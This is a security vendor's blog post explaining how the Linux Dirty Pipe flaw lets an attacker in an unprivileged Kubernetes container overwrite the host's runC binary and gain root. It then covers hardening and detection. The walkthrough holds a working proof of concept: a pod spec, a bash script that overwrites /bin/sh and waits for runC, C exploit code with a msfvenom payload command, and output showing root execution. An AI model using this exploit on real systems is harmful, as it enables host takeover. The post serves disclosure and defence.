---
schema_version: "1.0.0"
document_id: "fde69fbcca4e2b7976c401a11fb6eabd034db9d80e0992e68606ae4213ba1520"
company_key: "datadog-inc-class-a-common-stock"
company: "Datadog Inc."
source_id: "datadog-inc-class-a-common-stock-rss-a5f59b9b4ce5"
canonical_url: "https://www.datadoghq.com/blog/engineering/dirty-pipe-container-escape-poc/"
published_at: "2022-03-25T00:00:00+00:00"
first_seen_at: "2026-07-20T03:32:32.081856+00:00"
fetched_at: "2026-07-28T21:04:01.772019+00:00"
content_hash: "sha256:d83d0933072fe25d850a7ccdf0e4151baf8c07c8d6c743ce9e74e94952531534"
---

# Using the Dirty Pipe vulnerability to break out from containers

The[Dirty Pipe vulnerability](https://securitylabs.datadoghq.com/articles/dirty-pipe-vulnerability-overview-and-remediation/) is a flaw in the Linux kernel that allows an unprivileged process to write to any file it can read, even if it does not have write permissions on this file. This primitive allows for privilege escalation, for instance by overwriting the **/etc/passwd** file with a new admin user.


This vulnerability could be used for breaking out from unprivileged containers, including in Kubernetes environments. In this post, we will present a proof-of-concept exploit allowing an attacker having compromised such a container to escape to the underlying host and gain host-level administrative privileges.


## A Primer on container runtimes and the OCI specification


Kubernetes supports container runtimes that implement the Kubernetes Container Runtime Interface (CRI) specification, such as containerd or CRI-O. Container runtimes are responsible for pulling images from registries, managing them on the host, and creating lower-level Linux processes that are properly segmented from each other.


Creating low-level containerized Linux processes is a somewhat complex task that requires setting up control groups and kernel namespaces to ensure the process runs in a logical container and cannot, for instance, access the file system of other containerized processes. In reality, container runtimes don't create low-level processes themselves. Instead, they invoke a lower-level runtime that implements the[Open Container Interface (OCI) runtime specification](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md) , the most common of which is[runC](https://github.com/opencontainers/runc) .


## Breaking out from containers


When runC creates a containerized process, it proceeds as follows:


1. Fork itself to create a child process
2. [Set up](https://github.com/opencontainers/runc/blob/dd023c457d84de44fa61e6ff0e0cf6a0edd1005e//libcontainer/standard_init_linux.go#L76-L205) the containerized environment (kernel namespace, control groups, etc.)
3. Redirect the execution flow to the user-supplied entrypoint through the[execve](https://github.com/opencontainers/runc/blob/dd023c457d84de44fa61e6ff0e0cf6a0edd1005e//libcontainer/standard_init_linux.go#L206) system call


Over the years, several vulnerabilities have been discovered in runC that allow a malicious process to break out from an unprivileged container. In particular,[CVE-2019-5736](https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/) is a well-known vulnerability in which a malicious container entrypoint could overwrite the runC binary on the host, hence gaining root privileges.


This vulnerability takes advantage of the fact that, when` execve` is called to execute the user-supplied entrypoint, the file at **/proc/self/exe** —available inside the container—is associated with an open file descriptor for the runC binary on the host. Consequently, a malicious process inside the container could write to this file descriptor, overwrite the runC binary on the host, and escape from the container. See[here](https://github.com/twistlock/RunC-CVE-2019-5736) for a proof of concept by Yuval Avrahami.


To remediate the[CVE-2019-5736](https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/) vulnerability, the runC team implemented[a patch](https://github.com/opencontainers/runc/commit/0a8e4117e7f715d5fbeef398405813ce8e88558b) that clones the runC binary before executing it, to ensure it could not be overwritten from inside a container. About a month later, the runC team[changed this behavior again](https://github.com/opencontainers/runc/commit/16612d74de5f84977e50a9c8ead7f0e9e13b8628) to take advantage of kernel cache page sharing by mounting the runC binary inside the container read only. We'll see in the next section how this performance improvement makes Dirty Pipe exploitable for container escape.


## Old habits die hard


Thanks to the exploitation primitive the Dirty Pipe vulnerability provides us—that is, the ability to overwrite any file we can read—we have the ability to overwrite the runC binary on the host. This overwrite is not persistent and happens in the kernel page cache, so the original runC binary is left untouched on persistent storage and can be recovered by dropping caches or rebooting the machine. Regardless, it allows us to escape the container.


Our PoC exploit is similar to the exploitation of[CVE-2019-5736](https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/) . It runs inside an unprivileged container and works as follows:


1. Waits for runC to be executed inside the container. This happens, for instance, when an administrator performs a` kubectl exec` operation on the container.
2. As soon as runC runs inside the container, the exploit uses the Dirty Pipe exploit to overwrite the cloned binary with a malicious executable, through its file descriptor available at **/proc/<runC-pid>/exe** , and referencing the runC binary on the host.


## Exploitation walkthrough


Our full container breakout exploit code (derived from the original proof of concept of Max Kellermann) is available[on GitHub](https://github.com/DataDog/dirtypipe-container-breakout-poc) .


First, we start by running an unprivileged pod that is modeled on a pod that gets compromised by an attacker, for instance through a standard web application vulnerability. The pod specification doesn't have anything special, so the same exploitation steps can be taken by an attacker tricking a system administrator or deployment system into deploying an attacker-controlled malicious container image.


```text
$  cat   pod.yaml
apiVersion: v1
kind: Pod
metadata:
name: compromised-pod
spec:
containers:
- name: compromised-container
image: ghcr.io/datadog/dirtypipe-container-breakout
imagePullPolicy: Always
command:  [  "sh"  ,  "/wait-for-runc-and-overwrite.sh"  ]


$ kubectl apply  -f   pod.yaml


```


The entrypoint of the container in this pod is a bash script waiting for a runC process to run inside the container. It then uses the Dirty Pipe exploit to overwrite the runC binary on the host with a malicious ELF binary:


```text
#!/bin/bash


# Inspired from https://unit42.paloaltonetworks.com/breaking-docker-via-runC-explaining-cve-2019-5736/


# When /bin/sh is executed through kubectl exec, runC will be executed so our script can overwrite it
echo    '#!/proc/self/exe'    >   /bin/sh


echo    "Waiting for runC to be executed in the container"


while    true    ;    do
runC_pid  =  ""


while    [    -z    " $runC_pid  "    ]    ;    do
runC_pid  =  $(  ps   axf  |    grep   /proc/self/exe  |    grep    -v    grep    |    awk    '{print $1}'  )
done


/exploit /proc/ ${runC_pid}  /exe
done
```


We modified the original Dirty Pipe proof of concept to overwrite the target binary with a malicious one that runs the commands` id` and` hostname` , writing their output to **/tmp/hacked** .


```text


// original Dirty Pipe PoC from dirtypipe.cm4all.com
// and adaptation from https://haxx.in/files/dirtypipez.c


// Generated using msfvenom -a x86 -p linux/x86/exec CMD="id > /tmp/hacked && hostname >> /tmp/hacked" -f elf
// Note: The first ELF byte is removed, since the Dirty Pipe exploit cannot write on the first byte of a memory page
const    unsigned    char   malicious_elf_bytes [  ]    =    {
/*0x7f,*/    0x45  ,  0x4c  ,  .  .  .
}  ;
int    main  (  int   argc ,    char    *  *  argv )    {
if    (  argc  !=    2  )    {
fprintf  (  stderr  ,    "Usage: %s /proc/<runc_pid>/exe\n"  ,   argv [  0  ]  )  ;
return   EXIT_FAILURE ;
}


char    *  path  =   argv [  1  ]  ;
const    size_t   data_size  =    sizeof  (  malicious_elf_bytes )  ;
printf  (  "[+] hijacking runc..\n"  )  ;
if    (  hax  (  path ,    1  ,   malicious_elf_bytes ,   data_size )    !=    0  )    {
printf  (  "[~] failed\n"  )  ;
return   EXIT_FAILURE ;
}


printf  (  "[+] Successfully overwrote runC with our malicious binary!\n"  )  ;


return   EXIT_SUCCESS ;
}


```


The pre-requisite for the exploit to be successful is that a legitimate user runs a` kubectl exec` command in the container, causing runC to be executed in the same PID namespace as our malicious bash script.


```text
$ kubectl  exec    -it   compromised-pod --  sh
```


In the output of our malicious shell script, we then see:


```text
Waiting  for   runC to be executed  in   the container
[  + ]   Hijacking runC ..  .
[  + ]   Successfully overwrote runC with our malicious binary !
```


If we connect to the worker node, we notice the runC binary has indeed been overwritten with our malicious executable!


```text
# Before exploitation
root@pool-stbjbwsjv-cn15e:/ # md5sum /usr/bin/runc
4139ffa81a373778877c5987ac476a19  /usr/bin/runc


# After exploitation
root@pool-stbjbwsjv-cn15e:/ # md5sum /usr/bin/runc
721e312c0f3208913eaa6f3762b2d0cb  /usr/bin/runc
```


Still on the worker node, we notice our malicious commands have indeed been run as root, as the file **/tmp/hacked** can testify:


```text
uid  =  0  (  root )    gid  =  0  (  root )    groups  =  0  (  root )
pool-stbjbwsjv-cn15e
```


While we used a benign payload for the sake of illustration, one can build a stealthier backdoor that executes malicious commands before invoking runC, making exploitation much harder to notice, or establishing persistence on the underlying host.


## Discussion


The[initial patch](https://github.com/opencontainers/runc/commit/0a8e4117e7f715d5fbeef398405813ce8e88558b) for CVE-2019-5736 would have prevented this type exploitation since we'd have only managed to overwrite a *copy* of runC. However, the[follow-up commit](https://github.com/opencontainers/runc/commit/16612d74de5f84977e50a9c8ead7f0e9e13b8628) , which takes advantage of the kernel page cache and configures runC to bind-mount its binary as read only in the container, makes it possible to use the Dirty Pipe vulnerability.


We can confirm that clearing the kernel page cache "reverts" our overwrite of the runC binary.


```text
$ md5sum /usr/bin/runc
721e312c0f3208913eaa6f3762b2d0cb  /usr/bin/runc


$  echo    3    >   /proc/sys/vm/drop_caches


$ md5sum /usr/bin/runc
4139ffa81a373778877c5987ac476a19  /usr/bin/runc
```


Similarly, running the exploit against a custom version of runC that[disables the read-only mount](https://github.com/opencontainers/runc/blob/v1.1.0/libcontainer/nsenter/cloned_binary.c#L492-L494) of the runC binary inside the container neutralizes the exploit.


## Defense in depth


Following the defense-in-depth mindset, it's relevant to ask ourselves how the container breakout could have been prevented even if our cluster was vulnerable to Dirty Pipe. In this section, we'll discuss a few additional layers of security that would have prevented (or at least made more difficult) a container breakout using Dirty Pipe.


### Ensure containerized workloads don't run as root


Container workloads should not run as root. Under normal conditions being root inside a container doesn't immediately allow to escape, but it often makes it easier to break out when combined with a vulnerability such as Dirty Pipe.


Here are some recommendations to gain assurance that containerized Kubernetes workloads don't run as root inside containers.


- Set` runAsUser` and` runAsGroup` to non-zero values to run workloads as unprivileged users instead of root.
- Set` runAsNonRoot` to` true` to have the kubelet ensure that no process is running as root inside the container. For instance, it will prevent a container with a` runAsUser` set to 0 or that is unset from being executed.
- Set` allowPrivilegeEscalation` to` false` to ensure that common privilege escalation vectors based on SUID binaries cannot be used (this includes vulnerabilities in[PwnKit](https://www.datadoghq.com/blog/pwnkit-vulnerability-overview-and-remediation/) or[sudo](https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit) ).
- When possible, set` readonlyRootFilesystem` to` true` . This makes the file system of your container read-only, preventing some privilege escalation exploits from running properly.


These hardening practices can be enforced at runtime through Pod Security Admission (Kubernetes v1.23+), which replaces the now-deprecated[Pod Security Policies](https://kubernetes.io/docs/concepts/security/pod-security-admission/) , or by using an add-on admission controller such as[Kyverno](https://kyverno.io/) or[OPA Gatekeeper](https://github.com/open-policy-agent/gatekeeper) .


### Ensure only images from trusted registries can run in your cluster


As discussed earlier, the Dirty Pipe vulnerability can be leveraged for full host compromise if an attacker manages to deploy a malicious image in your cluster.


To reduce the likelihood of this happening, the best practice is to ensure that only images from container registries you trust can be run in the cluster. This is typically implemented through a validating admission controller such as[Kyverno](https://kyverno.io/policies/best-practices/restrict-image-registries/restrict-image-registries/) or[OPA Gatekeeper](https://github.com/open-policy-agent/gatekeeper) .


If your container registry supports image signing, you can also use an admission controller to verify the provenance of your images and ensure they have been signed with a specific private key as part of your standard build process. See for instance:[Signing container images in the GitHub Container Registry](https://github.blog/2021-12-06-safeguard-container-signing-capability-actions/) or[GCP Binary Authorization](https://cloud.google.com/binary-authorization) .


### Leverage AppArmor or SELinux to prevent potential privilege escalation vectors


Using AppArmor or SELinux to limit file system, kernel, and network activity that containerized applications can perform is a powerful way of preventing common privilege escalation vectors. AppArmor is generally considered easier to get started with, using tooling like[bane](https://github.com/genuinetools/bane) to generate profiles and[security-profiles-operator](https://github.com/kubernetes-sigs/security-profiles-operator) to easily deploy them on worker nodes.


## How Datadog Can Help


Datadog[Cloud Workload Security](https://www.datadoghq.com/product/security-platform/cloud-workload-security/) leverages real-time detections based on eBPF to identify common privilege escalation methods in virtual machines and containers. In particular, as of version 7.35, the Datadog Agent is able to detect Dirty Pipe exploitation in real time.


Datadog's[Gatekeeper integration](https://docs.datadoghq.com/integrations/gatekeeper/) allows you to identify potentially risky Kubernetes workloads from a centralized location.


Datadog[Cloud SIEM](https://www.datadoghq.com/product/security-platform/cloud-siem/) leverages audit logs from the Kubernetes API server to identify when[someone uses kubectl exec against a running container](https://docs.datadoghq.com/security/default_rules/1d5-6cd-162) , which might be used as a vector to trigger a container escape.


## Conclusion


Similar to the infamous[CVE-2019-5736](https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/) , the Dirty Pipe vulnerability can be exploited with minimal user interaction to achieve a breakout from an unprivileged container. For more information about the vulnerability, including how to use Datadog to detect whether it is being exploited within your systems, refer to[The Dirty Pipe Vulnerability: Overview, Detection, and Remediation](https://securitylabs.datadoghq.com/articles/dirty-pipe-vulnerability-overview-and-remediation/) .
